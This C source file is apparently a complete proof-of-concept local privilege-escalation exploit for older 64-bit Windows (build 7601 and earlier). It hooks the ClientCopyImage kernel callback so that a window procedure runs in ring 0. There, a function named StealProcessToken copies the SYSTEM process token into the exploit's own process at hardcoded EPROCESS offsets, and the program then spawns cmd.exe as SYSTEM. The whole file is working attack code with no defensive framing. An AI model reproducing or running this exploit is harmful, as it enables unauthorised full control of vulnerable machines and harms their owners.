/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.00
*
*  DATE:        10 May 2015
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//Disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4054) // 'type cast' : from function pointer %s to data pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union

#define OEMRESOURCE
#include <Windows.h>
#include <ntstatus.h>
#include "ntos.h"
#include "minirtl\minirtl.h"

#define TYPE_WINDOW 1
#define HMUNIQSHIFT 16

typedef NTSTATUS (NTAPI *pUser32_ClientCopyImage)(PVOID p);
typedef NTSTATUS (NTAPI *pPLPBPI)(HANDLE ProcessId, PVOID *Process);

typedef PVOID	PHEAD;

typedef struct _HANDLEENTRY {
	PHEAD   phead;  // Pointer to the Object.
	PVOID   pOwner; // PTI or PPI
	BYTE    bType;  // Object handle type
	BYTE    bFlags; // Flags
	WORD    wUniq;  // Access count.
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD            wRIPFlags;
	WORD            wSRVIFlags;
	WORD            wRIPPID;
	WORD            wRIPError;
	ULONG           cHandleEntries;
	// incomplete
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO		psi;
	PHANDLEENTRY	aheList;
	ULONG			HeEntrySize;
	// incomplete
} SHAREDINFO, *PSHAREDINFO;

static const TCHAR	MAINWINDOWCLASSNAME[] = TEXT("usercls348_Mainwindow");

pPLPBPI						g_PsLookupProcessByProcessIdPtr = NULL;
pUser32_ClientCopyImage		g_originalCCI = NULL;
PVOID						g_ppCCI = NULL, g_w32theadinfo = NULL;
int							g_shellCalled = 0;
DWORD						g_OurPID;
DWORD						g_EPROCESS_TokenOffset = 0;

/*
* supGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with HeapFree after usage.
* Function will return error after 100 attempts.
*
*/
PVOID supGetSystemInfo(
	_In_ SYSTEM_INFORMATION_CLASS InfoClass
	)
{
	INT			c = 0;
	PVOID		Buffer = NULL;
	ULONG		Size = 0x1000;
	NTSTATUS	status;
	ULONG       memIO;

	do {
		Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
		if (Buffer != NULL) {
			status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
		}
		else {
			return NULL;
		}
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			HeapFree(GetProcessHeap(), 0, Buffer);
			Size *= 2;
		}
		c++;
		if (c > 100) {
			status = STATUS_SECRET_TOO_LONG;
			break;
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status)) {
		return Buffer;
	}

	if (Buffer) {
		HeapFree(GetProcessHeap(), 0, Buffer);
	}
	return NULL;
}

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
	_In_ HANDLE hProcess
	)
{
	NTSTATUS status;
	PROCESS_EXTENDED_BASIC_INFORMATION pebi;

	if (hProcess == NULL) {
		return FALSE;
	}

	//query if this is wow64 process
	RtlSecureZeroMemory(&pebi, sizeof(pebi));
	pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
	if (NT_SUCCESS(status)) {
		return (pebi.IsWow64Process == 1);
	}
	return FALSE;
}

/*
* GetPsLookupProcessByProcessId
*
* Purpose:
*
* Return address of PsLookupProcessByProcessId routine to be used next by shellcode.
*
*/
ULONG_PTR GetPsLookupProcessByProcessId(
	VOID
	)
{
	BOOL						cond = FALSE;
	ULONG						rl = 0;
	PVOID						MappedKernel = NULL;
	ULONG_PTR					KernelBase = 0L, FuncAddress = 0L;
	PRTL_PROCESS_MODULES		miSpace = NULL;
	CHAR						KernelFullPathName[MAX_PATH * 2];


	do {

		miSpace = supGetSystemInfo(SystemModuleInformation);
		if (miSpace == NULL) {
			break;
		}

		if (miSpace->NumberOfModules == 0) {
			break;
		}

		rl = GetSystemDirectoryA(KernelFullPathName, MAX_PATH);
		if (rl == 0) {
			break;
		}

		KernelFullPathName[rl] = (CHAR)'\\';
		_strcpy_a(&KernelFullPathName[rl + 1],
			(const char*)&miSpace->Modules[0].FullPathName[miSpace->Modules[0].OffsetToFileName]);
		KernelBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
		HeapFree(GetProcessHeap(), 0, miSpace);
		miSpace = NULL;

		MappedKernel = LoadLibraryExA(KernelFullPathName, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (MappedKernel == NULL) {
			break;
		}

		FuncAddress = (ULONG_PTR)GetProcAddress(MappedKernel, "PsLookupProcessByProcessId");
		FuncAddress = KernelBase + FuncAddress - (ULONG_PTR)MappedKernel;

	} while (cond);

	if (MappedKernel != NULL) {
		FreeLibrary(MappedKernel);
	}
	if (miSpace != NULL) {
		HeapFree(GetProcessHeap(), 0, miSpace);
	}

	return FuncAddress;
}

/*
* GetFirstThreadHWND
*
* Purpose:
*
* Locate, convert and return hwnd for current thread from SHAREDINFO->aheList.
*
*/
HWND GetFirstThreadHWND(
	VOID
	)
{
	PSHAREDINFO		pse;
	HMODULE			huser32;
	PHANDLEENTRY	List;
	ULONG_PTR		c, k;

	huser32 = GetModuleHandle(TEXT("user32.dll"));
	if (huser32 == NULL)
		return 0;

	pse = (PSHAREDINFO)GetProcAddress(huser32, "gSharedInfo");
	if (pse == NULL)
		return 0;

	List = pse->aheList;
	k = pse->psi->cHandleEntries;

	if (pse->HeEntrySize != sizeof(HANDLEENTRY))
		return 0;

	//
	// Locate, convert and return hwnd for current thread.
	//
	for (c = 0; c < k; c++)
		if ((List[c].pOwner == g_w32theadinfo) && (List[c].bType == TYPE_WINDOW)) {
			return (HWND)(c | (((ULONG_PTR)List[c].wUniq) << HMUNIQSHIFT));
		}

	return 0;
}

/*
* StealProcessToken
*
* Purpose:
*
* Copy system token to current process object.
*
*/
NTSTATUS NTAPI StealProcessToken(
	VOID
	)
{
	NTSTATUS Status;
	PVOID CurrentProcess = NULL;
	PVOID SystemProcess = NULL;

	Status = g_PsLookupProcessByProcessIdPtr((HANDLE)g_OurPID, &CurrentProcess);
	if (NT_SUCCESS(Status)) {
		Status = g_PsLookupProcessByProcessIdPtr((HANDLE)4, &SystemProcess);
		if (NT_SUCCESS(Status)) {
			if (g_EPROCESS_TokenOffset) {
				*(PVOID *)((PBYTE)CurrentProcess + g_EPROCESS_TokenOffset) = *(PVOID *)((PBYTE)SystemProcess + g_EPROCESS_TokenOffset);
			}
		}
	}
	return Status;
}


/*
* MainWindowProc
*
* Purpose:
*
* To be called in ring0.
*
*/
LRESULT CALLBACK MainWindowProc(
	_In_ HWND hwnd,
	_In_ UINT uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
	)
{
	UNREFERENCED_PARAMETER(hwnd);
	UNREFERENCED_PARAMETER(uMsg);
	UNREFERENCED_PARAMETER(wParam);
	UNREFERENCED_PARAMETER(lParam);

	if (g_shellCalled == 0) {
		StealProcessToken();
		g_shellCalled = 1;
	}

	return 0;
}

/*
* hookCCI
*
* Purpose:
*
* _ClientCopyImage hook handler.
*
*/
NTSTATUS NTAPI hookCCI(
	PVOID p
	)
{
	InterlockedExchangePointer(g_ppCCI, g_originalCCI); //restore original callback

	SetWindowLongPtr(GetFirstThreadHWND(), GWLP_WNDPROC, (LONG_PTR)&DefWindowProc);

	return g_originalCCI(p);
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
void main()
{

	PTEB			teb = NtCurrentTeb();
	PPEB			peb = teb->ProcessEnvironmentBlock;
	WNDCLASSEX		wincls;
	HINSTANCE		hinst = GetModuleHandle(NULL);
	BOOL			rv = TRUE;
	MSG				msg1;
	ATOM			class_atom;
	HWND			MainWindow;
	DWORD			prot;
	OSVERSIONINFOW	osver;

	DWORD					cch;
	TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
	STARTUPINFO				startupInfo;
	PROCESS_INFORMATION		processInfo;


	RtlSecureZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	RtlGetVersion(&osver);
	
	if (osver.dwBuildNumber > 7601) {
		ExitProcess((UINT)-1);
		return;
	}

	if (supIsProcess32bit(GetCurrentProcess())) {
		ExitProcess((UINT)-2);
		return;
	}

	g_OurPID = GetCurrentProcessId();
	g_PsLookupProcessByProcessIdPtr = (PVOID)GetPsLookupProcessByProcessId();

#ifdef _WIN64
	g_EPROCESS_TokenOffset = 0x208;
#else
	g_EPROCESS_TokenOffset = 0xF8;
#endif


	if (g_PsLookupProcessByProcessIdPtr == NULL) {
		ExitProcess((UINT)-3);
		return;
	}

	RtlSecureZeroMemory(&wincls, sizeof(wincls));
	wincls.cbSize = sizeof(WNDCLASSEX);
	wincls.lpfnWndProc = &MainWindowProc;
	wincls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wincls.lpszClassName = MAINWINDOWCLASSNAME;

	class_atom = RegisterClassEx(&wincls);
	while (class_atom) {

		g_w32theadinfo = teb->Win32ThreadInfo;

		g_ppCCI = &((PVOID *)peb->KernelCallbackTable)[0x36]; //  <--- User32_ClientCopyImage INDEX
	
		if (!VirtualProtect(g_ppCCI, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
			break;
		}
		g_originalCCI = InterlockedExchangePointer(g_ppCCI, &hookCCI);

		MainWindow = CreateWindowEx(0, MAKEINTATOM(class_atom),
			NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

		if (g_shellCalled == 1) {

			RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
			RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
			startupInfo.cb = sizeof(startupInfo);
			GetStartupInfo(&startupInfo);

			RtlSecureZeroMemory(sysdir, sizeof(sysdir));
			cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
			if ((cch != 0) && (cch < MAX_PATH)) {
				RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
				_strcpy(cmdbuf, sysdir);
				_strcat(cmdbuf, TEXT("cmd.exe"));

				if (CreateProcess(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
					sysdir, &startupInfo, &processInfo))
				{
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}
			}

		}
		else {
			OutputDebugString(TEXT(" Failed \r\n"));
		}

		if (!MainWindow)
			break;

		do {
			rv = GetMessage(&msg1, NULL, 0, 0);

			if (rv == -1)
				break;

			TranslateMessage(&msg1);
			DispatchMessage(&msg1);
		} while (rv != 0);

		break;
	}

	if (class_atom)
		UnregisterClass(MAKEINTATOM(class_atom), hinst);

	ExitProcess(0);
}
